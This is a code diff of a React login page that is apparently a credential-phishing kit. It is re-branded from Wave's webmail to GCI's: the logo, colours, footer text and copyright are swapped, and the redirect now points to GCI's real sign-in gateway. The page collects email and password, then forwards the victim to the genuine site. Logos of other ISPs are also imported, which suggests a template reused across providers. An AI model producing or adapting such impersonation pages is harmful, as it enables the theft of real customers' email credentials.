@@ -10,6 +10,7 @@ import iglou from './iglou.png';
 import catskill from './catskill.png';
 import winstream from './windstream.png';
 import wave from './wave.png';
+import gci from './gci.png';
 
 function Home(){
 
@@ -17,7 +18,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Wave-Auth-Gateway")
+    const[platform, setPlatform] = useState("GCIemail")
 
     const[showError, setShowError] = useState(false);
 
@@ -44,7 +45,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://wave.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_759233ef7bf3b4e1e19d270d330200ca4ae7bb9884%3Ahttps%3A%2F%2Fwave.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.wavecable.com%252F%26cookieTime%3D1714740481';
+             window.location.href = 'https://gciemail.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_af9ed9b453df5f787e1d764d159af2ec8047e2c9a9%3Ahttps%3A%2F%2Fgciemail.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.gci.net%252F%26cookieTime%3D1714740538%26forceAuthn%3D1';
           }
         } catch (error) {
           // Handle error
@@ -68,7 +69,7 @@ function Home(){
 
 
             <div className='text-center my-2'>
-            <img  src={wave} className="mylogo"/>
+            <img  src={gci} className="mylogo"/>
 
             </div>
 
@@ -137,9 +138,9 @@ function Home(){
                     <div className='form-group text-center'>
 
 <button type='submit' style={{
-  backgroundColor: '#483092',
+  backgroundColor: '#bd1622',
   fontSize:'25px',
-}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>
+}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>SIGN IN</button>
 
 
 
@@ -152,9 +153,9 @@ function Home(){
   <a style={{
         color: '#1f8aa3',
         textDecoration: 'underline',
-  }}>Forgot Password <br/>
-Privacy Policy<br/>
-Terms of Service</a>
+  }}>Privacy Policy <br/>
+Terms of Use<br/>
+Forgot Password</a>
 
 </div>
 
@@ -165,7 +166,11 @@ Terms of Service</a>
 </br>
 
 <div className='text-center py-3'>
-  <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6>
+  {/* <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6> */}
+  <p style={{
+    fontSize:"12px",
+    fontWeight:"400"
+  }}>Copyright © 2024 GCI Communications Corp. All rights reserved.</p>
 </div>
                  
 
